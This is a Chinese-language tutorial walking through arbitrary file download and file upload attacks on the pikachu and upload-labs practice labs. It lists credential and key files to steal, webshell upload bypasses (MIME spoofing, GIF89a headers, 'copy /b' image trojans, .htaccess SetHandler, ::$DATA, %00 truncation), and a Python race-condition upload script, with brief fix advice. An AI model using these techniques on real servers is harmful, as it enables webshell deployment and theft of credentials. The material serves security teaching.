利用方式快速扫描下载漏洞的时候，不管是工具还是手工，我们怎么判断下载漏洞呢？它有几个关键的形式： ## 一般链接形式: download.php?path down.php?file data.php?file download.php?filename ## 或者包含参数: Src Inputfile Filepath Path Data 1-4 利用思路当遇到一个任意文件下载时，我们的一般利用思路:比如下载哪些文件呢？ (1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 (2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 (3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。如果是linux系统的话，尝试读取root.bash_history看自己是否具有root权限。如果没有的话。我们只能按部就班的利用..来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐， 我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。 如果我们遇到的是java+oracle环境，可以先下载WEB-INFclassesapplicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载WEB-INFclassesxxxxxxccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器，如果具有root权限，在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库varlibmlocatemlocate.db。这个数据库中含有本地所有文件信息。 Linux系统自动创建这个数据库，并且每天自动更新一次。当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。 locate 读取方法: locate mlocate.db admin 可以将mlocate.db中包含admin文件名的内容全部输出来 （4）常见利用文件 root.sshauthorized_keys root.sshid_rsa root.sshid_ras.keystore root.sshknown_hosts 记录每个访问计算机用户的公钥 etcpasswd 存用户名的 *** etcshadow 存密码的 *** etcmy.cnf mysql配置文件 *** etchttpdconfhttpd.conf apache配置文件 *** root.bash_history 用户历史命令记录文件 root.mysql_history mysql历史命令记录文件 procmounts 记录系统挂载设备 porcconfig.gz 内核配置文件 varlibmlocatemlocate.db 全文件路径 porcselfcmdline 当前进程的cmdline参数 1-5 漏洞修复（1）过滤”.”，使用户在url中不能回溯上级目录 不能目录穿越 .... （2）正则严格判断用户输入参数的格式 （3）php.ini配置open_basedir限定文件访问范围 9-3-2 任意文件上传2-1 测试流程只要看到有文件上传的地方都可以进行测试，都有可能存在漏洞，微信、qq、论坛等等，微信刚开始的时候就被人搞过一次。 2-2 防御手段 2-3 实战测试3-1 前端s校验绕过1-1 方式一如下上传文件是有格式要求的，只能传图片 我们上传一个非图片文件来看看效果 发现只要不是图片格式的文件，就会报错，那这个错误哪来的呢？找到这个源代码位置： 这是个典型的前端js校验，那么我们找到网站源代码，直接在浏览器上修改一下 然后上传一个非图片文件来看看效果，下面这个动作我是通过火狐来测试的，因为谷歌浏览器好像不太行，直接将那个onchange函数删掉了 然后发现xx.txt文件上传没问题了。然后我们上传一个木马上去，找到木马文件所在位置 返回火狐浏览器，上传这个文件 上传成功了，并且提示你了文件所在路径，我们直接通过浏览器来访问这个文件，网址是 http://192.168.0.15/pikachu/vul/unsafeupload/uploads/webshell.php 效果：密码就是刚才nodepad++打开的wenshell.php文件里面显示的密码 获取到了webshell对系统进行控制。 其实前端js校验绕过的话，还可以通过burp抓包，修改包的形式进行绕过 1-2 方式二1.先将webshell.php改一下扩展名，比如叫做webshell.jpg，为了能够上传昂，这里我复制了一份 2.pikachu中上传一个webshell.jpg图片，然后抓包，看效果，下面这个图片是我之前搞的了，之前我的webshell.jpg，我改名为了123.jpg 3.抓到了这个开始上传的请求时，其实前端js代码对于文件格式的拦截已经结束了，我们抓到的就是上传文件的请求包了，然后将文件名称改为webshell.php，然后放包，就上传成功了。 3-2 服务端校验绕过2-1 MIME类型检查每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。 常见的MIME类型(通用型)： 超文本标记语言文本 .html texthtml xml文档 .xml textxml XHTML文档 .xhtml applicationxhtml+xml 普通文本 .txt textplain RTF文本 .rtf applicationrtf PDF文档 .pdf applicationpdf Microsoft Word文件 .word applicationmsword PNG图像 .png imagepng GIF图形 .gif imagegif JPEG图形 .jpeg,.jpg imagejpeg au声音文件 .au audiobasic MIDI音乐文件 mid,.midi audiomidi,audiox-midi RealAudio音乐文件 .ra, .ram audiox-pn-realaudio MPEG文件 .mpg,.mpeg videompeg AVI文件 .avi videox-msvideo GZIP文件 .gz applicationx-gzip TAR文件 .tar applicationx-tar 任意的二进制数据 applicationoctet-stream 我们随便上传一个非图片文件，然后点击开始上传，抓到这个包，放到重发器，然后发送这个包，看响应结果，发现报错了 其实我们看代码，就会发现，它是通过Content-Type这个请求分段数据部分的请求头信息来进行文件类型判断的，这个请求头的值是固定的，根据你上传的文件类型，自动添加的请求头的值。看代码能看到，它只支持图片格式。 接下来进行绕过，其实就修改一下这个请求头的值即可，改为： imagepng 上传文件简单分析 ## 通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。 ## 第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或”error”。就像这样： $_FILES[“file”][“name”] - 被上传文件的名称 $_FILES[“file”][“type”] - 被上传文件的类型 $_FILES[“file”][“size”] - 被上传文件的大小，以字节计 $_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称 $_FILES[“file”][“error”] - 由文件上传导致的错误代码 ## 详细可参考：http://www.w3school.com.cn/php/php_file_upload.asp ## 分析代码逻辑：首先会获取到前端的提交请求，然后定义了一个数组（定义图片上传指定类型），然后通过upload_sick函数对上传的文件进行一定的检查。 ## 分析upload_sick函数（定义在uploadfunction.php文件里面）存在漏洞的的原因是因为 $ _FILES() 这个全局的方法是通过浏览器http头去获取的content-type，content-type是前端用户可以控制的。容易被绕过。 ## 上传一张正常的符合标准的图片，对其content-type进行抓包操作。可见正常上传符合要求的图片中数据包中content-type为imagepng对比符合条件，而php文件则不符合条件返回文件类型错误。 2-2 代码注入绕过–getimagesize()getimagesize() 是php的一个函数，用于获取图像大小及相关信息，成功返回一个数组，失败则返回FALSE 并产生一条 E_WARNING 级的错误信息，如果用这个涵数来获取类型，从而判断是否是图片的话，会存在问题。其实这个函数比较难绕过，也就是比较安全的一个函数，绕过它三种方法，但是利用起来还需要一个前提条件，就是对方站点还要有一个文件包含漏洞，才能绕过它，或者修改文件数据的头部数据。 函数用法: 语法格式： array getimagesize ( string $filename [, array $imageinfo ] ) getimagesize() ## 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。 发现报错了，如果看到这个错误，就是我们php版本的问题 ## 从php5.3 ，当对使用date()等函数时，如果timezone设置不正确，在每一次调用时间函数时,都会产生E_NOTICE 或者 E_WARNING 信息。知道了问题的根源，解决的方法有三种，任选一种即可。 ## 一、在页头使用date_default_timezone_set()设置 date_default_timezone_set(‘PRC’); ## 二、在页头使用ini_set(‘date.timezone’,’AsiaShanghai’); ## 三、修改php.ini。打开php5.ini查找date.timezone 去掉前面的分号修改成为：date.timezone PRC ## 注意：上述设置都是针对中国大陆来设置的，同时PRC也可以用AsiaShanghai，AsiaChongqing，AsiaUrumqi来代替 phpstudy解决起来比较简单，切换版本即可 然后再回来，点击开始上传，就提示你格式不对了 按照之前的方式肯定是不能绕过了，那如何绕过呢？ 文件包含漏洞之文件上传漏洞利用，这句话的意思是，我们将木马做成图片格式，也就是图片携带木马，这种情况，利用上传漏洞来攻击。看方法 方法一：直接伪造头部GIF89A 方法二：CMD方法，copy b test.png+1.php muma.png 方法三：直接使用工具增加备注写入一句话木马。 方法一：直接伪造头部GIF89A GIF89A是gif图片格式的数据开头。 每种类型的文件，文件数据的开头都是不同的，相同的文件类型，打开之后，文件数据肯定是相同的， 比如我们通过记事本以16进制的形式打开几个图片看看效果： 而getimagesize() 函数除了检查了文件扩展名，还会检查文件数据，当我们上传了一个非图片文件，然后通过burp改了数据包，改为了图片格式的后缀名，发送包之后，报错了，所以如果php开发人员使用了这个函数，那么我们攻击时，要考虑这个事情。但是，这个函数不是将文件内容全部检查一遍，它检查的就是文件数据中的前面标识文件格式的数据。 那么我们将git图片格式数据的头数据放到我们数据包的前面，那么我们看看是否能够绕过 果然，成功了。 方法二：copy方法 CMD方法： copy b test.png+1.php muma.png 好，我们先创建一个muma文件，如下 里面放的菜刀的php一句话木马 然后我们再copy一个图片到这个目录下 现在是一个码，一个正常图片，通过如下指令，将两者结合，通过copy命令即可 copy b kb.png+muma.txt muma.png 效果： 通过文本编辑器，比如nodepad++打开看效果： 看到了我们的木马程序，然后将这个图片上传到目标服务器上去即可，这里我就不演示了。 方法三：直接使用工具增加备注写入一句话木马 这是通过工具给图片等文件数据加入木马程序数据，但是和方法二不同的就是，方法二是将木马程序放到了文件数据的结尾，这个工具是将木马程序放到文件数据的随机位置，它可以绕过二次渲染。这个二次渲染我们后面会讲。 弹出如下窗口，一句话木马放进去，点击ok 这个图片就加上了一句话木马，这个木马程序通过菜刀就能连接 这种方式比前面两个方式都好一些，算是最好手段了。 那么将含有木马程序的图片上传到目标服务器上，比如我将这个test.jpg文件 能够当作木马执行吗？默认情况下肯定是不行的，这样我们先访问一下我们上传到服务器上的图片网址，看效果 http://192.168.0.15/pikachu/vul/unsafeupload/uploads/2021/09/17/855149614490b3007b9961050981.jpg 针对这个路径，我们可以通过注入的方式来找到我们的木马文件所在路径，从而触发我们的图片中的木马程序 http://192.168.0.15/pikachu/vul/fileinclude/fi_local.php?filename=file1.phpsubmit=%E6%8F%90%E4%BA%A4 ## file1.php所在目录： C:\\phpStudy\\PHPTutorial\\WWW\\pikachu\\vul\\fileinclude\\include 通过它来找到我们的图片文件 它需要结合另外一个漏洞才能将任意文件当作脚本来执行，比如图片带木马的文件，如果要执行，需要配置文件包含漏洞，这个漏洞我们后面讲。这个getimagesize()函数虽然能够对文件格式做和好的限制，但是我们通过文件包含漏洞也就是文件中包含木马的方式也能进行攻击渗透。菜刀连接 双击连接，控制服务器 方法四：检查后缀 就是对文件后缀名进行判断，那么我们采取两种方式绕过，黑名单和白名单。 黑名单指的是程序员在写代码的时候，有时候会将一些php、jsp等脚本或者代码加入黑名单，这种处理方式不太好，因为很容易绕过。 大家先搭建一个网站，这个网站文件夹我给大家放到工具里面了，就是一个叫做upload的文件夹，将它放入到phpstudy的www目录中去即可使用 然后在upload文件夹里面在创建一个文件夹，也叫做upload 然后访问网址： http://192.168.0.15/upload/ 这个网站基本上包含了所有的文件上传漏洞示例，我们一个个学习一下。如果你将这个20个题都做出来了，那么基本上对于现实的网站的文件上传漏洞都能搞，如果结合这些手段还是没有完成文件上传漏洞攻击，那么基本上就可以宣告不能攻击了。 9-3-3 20关3-1 第一关：前端校验绕过3-2 第二关：mime类型我们从第三关开始。 3-3 第三关：黑名单绕过之php3、php5 大家可以看看源代码 $is_upload false; $msg null; if (isset($_POST[‘submit’])) { if (file_exists(UPLOAD_PATH)) { $deny_ext array(‘.asp’,’.aspx’,’.php’,’.jsp’); 黑名单 $file_name trim($_FILES[‘upload_file’][‘name’]); $file_name deldot($file_name);删除文件名末尾的点 $file_ext strrchr($file_name, ‘.’); $file_ext strtolower($file_ext); 转换为小写 $file_ext str_ireplace(‘::$DATA’, ‘’, $file_ext);去除字符串::$DATA，这 个怎么绕过，后面会将 $file_ext trim($file_ext); 首尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $img_path UPLOAD_PATH.’‘.date(“YmdHis”).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload true; } else { $msg ‘上传出错！’; } } else { $msg ‘不允许上传.asp,.aspx,.php,.jsp后缀文件！’; } } else { $msg UPLOAD_PATH . ‘文件夹不存在,请手工创建！’; } } 这里是黑名单验证(‘.asp‘,‘.aspx‘,‘.php‘,‘.jsp‘)，我们可上传php3,php5…等这样可以被服务器解析的后缀名，当然，这个是根据服务器的配置来，如果配置中可以被解析，那么我们就可以上传这样的文件，不过现在apache等默认是不支持这种文件解析了。比如下面这种 现在默认是解析不了的，除非改apache的配置文件 通过路径打开 效果：都是代码，没有被解析执行 让apache解析，修改httpd配置文件，如下位置 AddType applicationx-httpd-php .php .phtml php3 php5 3-4 第四关：黑名单绕过 .htaccess和文件名叠加特性绕过 分析代码发现，这里对上传的后缀名的判断增加了，php3.php5….已经不允许上传，但是没有限制.htaccess文件的上传，所以我们依然可以使用。 补充一个.htaccess文件漏洞这是也是黑名单中的一种方法，黑名单中没有将这个后缀名的文件加入黑名单，那么我们就可以利用这种文件来进行攻击，这种文件是apache的一个配置文件，里面我们写了三行代码。可以说是，这个文件中可以改apache的配置，导致apache出现解析漏洞。 SetHandler applicationx-httpd-php 如下了解内容，有兴趣的可以看一看： ## .htaccess是什么，下面的内容不用看。 ## .htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 ## 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 ## 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 ## 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 ## .htaccess文件可以在网站目录树的任何一个目录中，只对该文件所在目录中的文件和子目录有效。 注意： ## 子目录中的指令会笼盖更高级目录或者主器配置中的指令。 ## 如果 .htaccess 文件保存在 apachehomewwwGunjit 目录，那么它会向该目录中的所有文件和子目录提供命令，但如果该目录包含一个名为 Gunjitimages 子目录，且该子目录中也有一个.htaccess 文件，那么这个子目录中的命令会覆盖父目录中 .htaccess 文件(或者目录层次结构中更上层的文件)提供的命令。 ## .htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 ## .htaccess必需以ASCII模式上传，最好将其权限设置为644。使用.htaccess文件，会降低httpd服务器的一点性能为什么要使用.htaccess ## 很多网站都是租用服务器和虚拟主机的，其服务器的配置我们并不能改。当我们有特殊要求时，比如定义最简单的404（页面未找到）的错误页面，我们就只能通过apache配置的扩展配置（或者说是子配置）来更改扩展原服务器的配置。这个配置就是.htaccess文件，他是apache下的http.conf文件的延续。 我们只要把这个文件上传上去，然后再上传一个jpg啊之类的可上传的后缀名文件上去，那么apache都会当作php文件来解析，我这里就不上传了，比如我们在upload文件夹中放这么两个文件： 浏览器访问一些这个tu.jpg文件，看效果 这个tu.jpg文件就是下面这个文件改的名字，vstart中有。 分号配合IIS解析漏洞还有另外一种方式是通过分号来命名，这是一个windows2003上的IIS服务的解析漏洞 演示： 然后通过浏览器来访问一下这个文件 木马执行了。 然后大家在下面上传这个文件就行了，我这里就不演示了 冒号配合PHP 和 Windows文件命名环境的叠加特性另外一种方法就是利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性： 利用PHP 和 Windows环境的叠加特性，在windows直接修改文件名称，肯定是不让你加冒号的，所以我们先以图片的格式上传，然后抓包，修改文件名称，加上冒号，上传一个名为 123.php:.jpg 的文件 上传上去之后的效果，由于文件名称不允许出现冒号，所有windows就将冒号和后面的字符都去掉了，就剩下123.php了，但是有个点就是，文件为0kb 然后将文件名改为 123. 或 123. 或 123. 或 123. 后再次上传，重写 123.php 文件内容，Webshell代码就会写入原来的 123.php 空文件中。 效果：内容又有了 所以这种方式分两步：1上传文件，2追加写入内容。 3-5 第五关：大小写混合绕过 分析代码，发现以.htaccess为后缀的文件已经不允许上传，并且上传的文件被改名字了，所以我们上面的方式都不行了，但是 $ file_ext strtolower( $file_ext); 转换为小写 这一句没有了，我们就可以使用文件名后缀大小写混合绕过，把1.php改为1.phP…来上传 这样的文件能执行吗，可以的，因为windows系统不区分大小写。访问一下这个文件 虽然报错了，但是意味着肯定执行了，报错是我们上传的木马代码的问题昂。 3-6 第六关：空格和点配合绕过里面的代码将上传的文件名都改为小写了，那么上面的方法就不行了。 利用Windows系统的文件名特性。文件名最后增加空格和点**，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php 3-7 也是空格和点配合绕过 原理同Pass-06，文件名后加点和空格，改成 1.php. ，这个我们就不演示了 3-8 第八关：基于文件流特性**::$DATA来绕过windows下的ntfs文件流特性来玩的。 分析代码，少了 $ file_ext str_ireplace(‘:: $DATA‘, ‘‘, $ file_ext);去除字符串:: $DATA 这一句，我们可以采用Windows文件流特性绕过，文件名改为1.php::$DATA , 上传成功后保存的文件名其实是1.php 3-9 第九关：点空格点绕过 原理同Pass-06，上传文件名后加上点+空格+点，改为 1.php. . ，这里我就不演示了 3-10 双写绕过 分析代码，由于 $ file_name str_ireplace( $deny_ext,””, $file_name); 只对文件后缀名进行一次过滤，这样的话，双写文件名绕过，文件名改成1.pphphp 白名单方式如下 3-11 第十一关：%00截断这个属于白名单绕过，这是php语言自身的问题，php低版本存在的漏洞 $is_upload false; $msg null; if(isset($_POST[‘submit’])){ $ext_arr array(‘jpg’,’png’,’gif’); $file_ext substr($_FILES[‘upload_file’] [‘name’],strrpos($_FILES[‘upload_file’][‘name’],”.”)+1); if(in_array($file_ext,$ext_arr)){ $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $img_path $_GET[‘save_path’].”“.rand(10, 99).date(“YmdHis”).”.”.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg ‘上传出错！’; } } else{ $msg “只允许上传.jpg|.png|.gif类型文件！”; } } 分析代码，这是以时间戳的方式对上传文件进行命名，使用上传路径名%00截断绕过，不过这需要对文件有足够的权限，比如说创建文件夹，上传的文件名写成1.jpg, save_path改成..upload1.php%00 (1.php%00.jpg经过url转码后会变为1.php\\000.jpg)，最后保存下来的文件就是1.php 其中下面这个路径被%00给截断了，后面的路径不生效了。 修复建设： php版本要小于5.3.4，5.3.4及以上已经修复该问题；并且magic_quotes_gpc需要为OFF状态 注意，这里还有个漏洞，如果目录有写入权限的话或者说可以修改的话，是比较危险的 比如：这就是windows的特性，如果文件夹的名字为xx.asp，那么它里面的文件都会被当作asp文件。 3-12第十二关：0x00绕过$is_upload false; $msg null; if(isset($_POST[‘submit’])){ $ext_arr array(‘jpg’,’png’,’gif’); $file_ext substr($_FILES[‘upload_file’] [‘name’],strrpos($_FILES[‘upload_file’][‘name’],”.”)+1); if(in_array($file_ext,$ext_arr)){ $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $img_path $_POST[‘save_path’].”“.rand(10, 99).date(“YmdHis”).”.”.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg “上传失败”; } } else { $msg “只允许上传.jpg|.png|.gif类型文件！”; } } 原理同Pass-11**，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成..upload1.php【二进制00】形式 然后回来看，就出现了口一样的效果 上传成功了 3-13 第十三关：绕过文件头检查这个我们上面讲过了的。 function getReailFileType($filename){ $file fopen($filename, “rb”); $bin fread($file, 2); 只读2字节 fclose($file); $strInfo @unpack(“C2chars”, $bin); $typeCode intval($strInfo[‘chars1’].$strInfo[‘chars2’]); $fileType ‘’; switch($typeCode){ case 255216: $fileType ‘jpg’; break; case 13780: $fileType ‘png’; break; case 7173: $fileType ‘gif’; break; default: $fileType ‘unknown’; } return $fileType; } $is_upload false; $msg null; if(isset($_POST[‘submit’])){ $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $file_type getReailFileType($temp_file); if($file_type ‘unknown’){ $msg “文件未知，上传失败！”; }else{ $img_path UPLOAD_PATH.”“.rand(10, 99).date(“YmdHis”).”.”.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg “上传出错！”; } } } 绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查。 或者我们使用命令copy 1.jpg b + shell.php a webshell.jpg，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。但是我们没有办法拿到shell，应为我们上传的图片马无法被解析成php形式，通常图片马配合%00或者0x00截断上传，或者配合解析漏洞 3-14 第十四关 image_type_to_extension()绕过这个我们讲过了。 function isImage($filename){ $types ‘.jpeg|.png|.gif’; if(file_exists($filename)){ $info getimagesize($filename); $ext image_type_to_extension($info[2]); if(stripos($types,$ext)0){ return $ext; }else{ return false; } }else{ return false; } } $is_upload false; $msg null; if(isset($_POST[‘submit’])){ $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $res isImage($temp_file); if(!$res){ $msg “文件未知，上传失败！”; }else{ $img_path UPLOAD_PATH.”“.rand(10, 99).date(“YmdHis”).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg “上传出错！”; } } } getimagesize() 函数用于获取图像尺寸 ，索引 2 给出的是图像的类型，返回的是数字，其中1 GIF，2 JPG，3 PNG，4 SWF，5 PSD，6 BMP，7 TIFF(intel byte order)，8 TIFF(motorola byte order)，9 JPC，10 JP2，11 JPX，12 JB2，13 SWC，14 IFF，15 WBMP，16 XBM这里有详解：https://blog.csdn.net/sanbingyutuoniao123/article/details/52166617 image_type_to_extension() 函数用于获取图片后缀 3-15 第十五关: exif_imagetype()绕过和14差不多，不讲了。 function isImage($filename){ 需要开启php_exif模块 $image_type exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return “gif”; break; case IMAGETYPE_JPEG: return “jpg”; break; case IMAGETYPE_PNG: return “png”; break; default: return false; break; } } $is_upload false; $msg null; if(isset($_POST[‘submit’])){ $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $res isImage($temp_file); if(!$res){ $msg “文件未知，上传失败！”; }else{ $img_path UPLOAD_PATH.”“.rand(10, 99).date(“YmdHis”).”.”.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg “上传出错！”; } } } 其中：exif_imagetype() 此函数是php内置函数，用来获取图片类型 3-16 第十六关：二次渲染绕过这个多了二次渲染，比较难的一个。 $is_upload false; $msg null; if (isset($_POST[‘submit’])){ 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename $_FILES[‘upload_file’][‘name’]; $filetype $_FILES[‘upload_file’][‘type’]; $tmpname $_FILES[‘upload_file’][‘tmp_name’]; $target_pathUPLOAD_PATH.’‘.basename($filename); 获得上传文件的扩展名 $fileext substr(strrchr($filename,”.”),1); 判断文件后缀与类型，合法才进行上传操作 if(($fileext “jpg”) ($filetype”imagejpeg”)){ if(move_uploaded_file($tmpname,$target_path)){ 使用上传的图片生成新的图片 $im imagecreatefromjpeg($target_path); if($im false){ $msg “该文件不是jpg格式的图片！”; @unlink($target_path); }else{ 给新图片指定文件名 srand(time()); $newfilename strval(rand()).”.jpg”; 显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path UPLOAD_PATH.’‘.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload true; } } else { $msg “上传出错！”; } }else if(($fileext “png”) ($filetype”imagepng”)){ if(move_uploaded_file($tmpname,$target_path)){ 使用上传的图片生成新的图片 $im imagecreatefrompng($target_path); if($im false){ $msg “该文件不是png格式的图片！”; @unlink($target_path); }else{ 给新图片指定文件名 srand(time()); $newfilename strval(rand()).”.png”; 显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path UPLOAD_PATH.’‘.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload true; } } else { $msg “上传出错！”; } }else if(($fileext “gif”) ($filetype”imagegif”)){ if(move_uploaded_file($tmpname,$target_path)){ 使用上传的图片生成新的图片 $im imagecreatefromgif($target_path); if($im false){ $msg “该文件不是gif格式的图片！”; @unlink($target_path); }else{ 给新图片指定文件名 srand(time()); $newfilename strval(rand()).”.gif”; 显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path UPLOAD_PATH.’‘.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload true; } } else { $msg “上传出错！”; } }else{ $msg “只允许上传后缀为.jpg|.png|.gif的图片文件！”; } } 原理：是将用户上传过来的文件数据重新读取保存到另外一个文件中，那么在读取写入的过程中，将特殊的数据剔除掉了。将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片示例。 php图像二次渲染： https://blog.csdn.net/hitwangpeng/article/details/48661433https://blog.csdn.net/hitwangpeng/article/details/46548849 https://xz.aliyun.com/t/2657 这两个讲的还可以 比如用我们之前做好的图片木马继续上传一下 然后文件已经到了服务器，当我们通过编辑器打开这个图片数据时，已经看不到我们加到图片中的木马数据了 分别上传一下这及个文件，看看哪个被干掉了。 最后发现就gif那个图片上传玩之后，木马程序依然还在。 说明什么，说明这是一个坚强的木马，我们就将这个文件保存下来，大家就是这样用很多的木马图片去试，试出来的结果，没干掉的就保存下来。原因就是有些木马程序所在的位置，二次渲染也没有发现。 3-17 第十七关：条件竞争之时间竞争唯品会就出现过这个漏洞，叫做时间竞争漏洞。这也是ctf考试的时候经常会考的题目。 CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。 看代码 $is_upload false; $msg null; if(isset($_POST[‘submit’])){ $ext_arr array(‘jpg’,’png’,’gif’); $file_name $_FILES[‘upload_file’][‘name’]; $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $file_ext substr($file_name,strrpos($file_name,”.”)+1); $upload_file UPLOAD_PATH . ‘‘ . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path UPLOAD_PATH . ‘‘. rand(10, 99).date(“YmdHis”).”.”.$file_ext; rename($upload_file, $img_path); $is_upload true; }else{ $msg “只允许上传.jpg|.png|.gif类型文件！”; unlink($upload_file); } }else{ $msg ‘上传出错！’; } } 利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。 #!usrbinenv python 2 # coding:utf-8 3 4 5 import hackhttp 6 from multiprocessing.dummy import Pool as ThreadPool 7 8 9 def upload(lists): 10 hh hackhttp.hackhttp() 11 raw “””POST upload-labsPass-17index.php HTTP1.1 12 Host: 127.0.0.1 13 User-Agent: Mozilla5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko20100101 Firefox49.0 14 Accept: texthtml,applicationxhtml+xml,applicationxml;q0.9,;q0.8 15 Accept-Language: zh-CN,zh;q0.8,en-US;q0.5,en;q0.3 16 Accept-Encoding: gzip, deflate 17 Referer: http://127.0.0.1/upload-labs/Pass-17/index.php 18 Cookie: pass17 19 Connection: close 20 Upgrade-Insecure-Requests: 1 21 Content-Type: multipartform-data; boundary————————– -6696274297634 22 Content-Length: 341 23 24 —————————–6696274297634 25 Content-Disposition: form-data; name”upload_file”; filename”17.php” 26 Content-Type: applicationoctet-stream 27 28 29 —————————–6696274297634 30 Content-Disposition: form-data; name”submit” 31 32 上传 33 —————————–6696274297634– 34 “”” 35 code, head, html, redirect, log hh.http(‘http://127.0.0.1/upload\u0002labs/Pass-17/index.php‘, rawraw) 36 print(str(code) + “\\r”) 37 38 39 pool ThreadPool(10) 40 pool.map(upload, range(10000)) 41 pool.close() 42 pool.join() 看示例： 虽然报错了，但是其实这个文件到过服务器了，只是瞬间消失了，被干掉了。我们burp抓包来看，将包放到测试器中来查看，别忘了清楚一下变量 然后设置参数 在设置一下线程数，让他发送的快一些 这里我上传我的tj.php，然后不停的访问test.php上传后的地址，即http://www.hack_upload.comuploadtest.php 然后点击开始攻击，我们盯着这个文件夹 看到这个文件上传到服务器上了，那么我们就可以在它删除文件之前，通过这个时间差来搞事情。 这里使用两个发包器，一个包是上传我们test.php的包，一个是访问我们上传test.php后的地址，不停的访问这个文件。每一个测试器的参数都设置的高一些，3000个包，100个线程。然后我们发现tj.php被访问了，并且执行了，生成了qing.php文件 那么这个文件中如果有我们的一句话木马，那么我们就可以获得webshell了。我们访问一下qing.php，效果出来了。 3-18 第十八关：条件竞争之重命名竞争这一关我们演示不出来昂，因为我没有准备低版本的apache，apache2.x之后的都算是高版本的。这里利用了低版本的apache解析漏洞。 刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。 